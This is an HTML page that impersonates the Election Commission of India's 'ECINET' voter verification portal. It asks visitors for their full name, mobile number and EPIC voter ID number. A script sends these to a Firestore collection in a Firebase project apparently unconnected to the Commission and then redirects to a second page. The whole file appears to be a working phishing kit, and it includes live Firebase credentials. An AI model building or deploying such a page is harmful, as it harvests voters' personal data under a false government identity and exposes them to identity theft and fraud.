<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECINET - Voter Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 15px; 
        }

        /* Main Container */
        .form-container { 
            background: #ffffff; 
            padding: 0 30px 30px 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
            width: 100%; 
            max-width: 440px; 
            overflow: hidden; 
        }

        /* Top Blue Header Section (Matching Screenshot) */
        .top-header {
            margin-left: -30px;
            margin-right: -30px;
            margin-bottom: 25px;
            padding: 25px 20px;
            width: calc(100% + 60px);
            background-color: #0056b3;
            text-align: center;
            color: white;
        }

        .top-header img {
            width: 55px;
            height: auto;
            margin-bottom: 12px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .top-header .hindi-title {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 4px;
            letter-spacing: 0.5px;
        }

        .top-header .eng-title {
            font-size: 12px;
            font-weight: 400;
            margin-bottom: 15px;
            opacity: 0.9;
        }

        .top-header h1 {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        /* Form Fields Styling */
        .form-group { 
            margin-bottom: 18px; 
            text-align: left; 
        }

        .form-group label { 
            display: block; 
            margin-bottom: 6px; 
            color: #004085; 
            font-weight: 700; 
            font-size: 11px; 
            letter-spacing: 0.8px;
            text-transform: uppercase;
        }

        .form-group input { 
            width: 100%; 
            padding: 12px 14px; 
            border: 1px solid #dfe4ea; 
            border-radius: 8px; 
            font-size: 14px; 
            background: #f8f9fa; 
            color: #333;
        }

        .form-group input::placeholder {
            color: #adb5bd;
        }

        .form-group input:focus { 
            outline: none; 
            border-color: #0056b3; 
            background: #fff;
            box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); 
        }

        /* Verify Button Styling */
        .btn-next { 
            width: 100%; 
            padding: 14px; 
            background: #0056b3; 
            border: none; 
            border-radius: 8px; 
            color: white; 
            font-size: 15px; 
            font-weight: bold; 
            letter-spacing: 1px;
            cursor: pointer; 
            margin-top: 10px; 
            text-transform: uppercase;
            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3);
        }

        .btn-next:hover { 
            background: #004085; 
        }

        /* Footer Styling */
        .footer-text {
            text-align: center;
            margin-top: 25px;
            font-size: 10px;
            color: #666;
            font-weight: 600;
            border-top: 1px solid #eee;
            padding-top: 15px;
            line-height: 1.4;
            letter-spacing: 0.3px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="form-container">
        
        <!-- Top Header with Logo & Titles matching screenshot -->
        <div class="top-header">
            <img src="logo.png" alt="Election Commission Logo">
            <div class="hindi-title">भारत निर्वाचन आयोग</div>
            <div class="eng-title">Election Commission of India</div>
            <h1>ECINET</h1>
        </div>
        
        <form id="voterForm">
            <div class="form-group">
                <label for="fullname">Enter Full Name</label>
                <input type="text" id="fullname" name="fullname" placeholder="Full name as per voter card" required>
            </div>
            
            <div class="form-group">
                <label for="mobile">Enter Mobile Number</label>
                <input type="tel" id="mobile" name="mobile" placeholder="10-digit mobile" maxlength="10" required>
            </div>

            <div class="form-group">
                <label for="epic">Enter EPIC Number</label>
                <input type="text" id="epic" name="epic" placeholder="Enter EPIC number" required>
            </div>

            <button type="submit" class="btn-next">Verify</button>
        </form>

        <div class="footer-text">
            भारत निर्वाचन आयोग | Election Commission of India
        </div>
    </div>

    <!-- Firebase SDK aur Data Saving Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('voterForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const fullname = document.getElementById('fullname').value;
            const mobile = document.getElementById('mobile').value;
            const epic = document.getElementById('epic').value;

            try {
                const docRef = await addDoc(collection(db, "voterSubmissions"), {
                    fullname: fullname,
                    mobile: mobile,
                    epic: epic,
                    time: new Date().toLocaleString()
                });

                localStorage.setItem('voterDocId', docRef.id);
                window.location.href = "secondpage.html";
            } catch (error) {
                console.error("Error adding document: ", error);
                alert("Data save karne me samasya aayi hai, kripya dobara prayas karein.");
            }
        });
    </script>
</body>
</html>
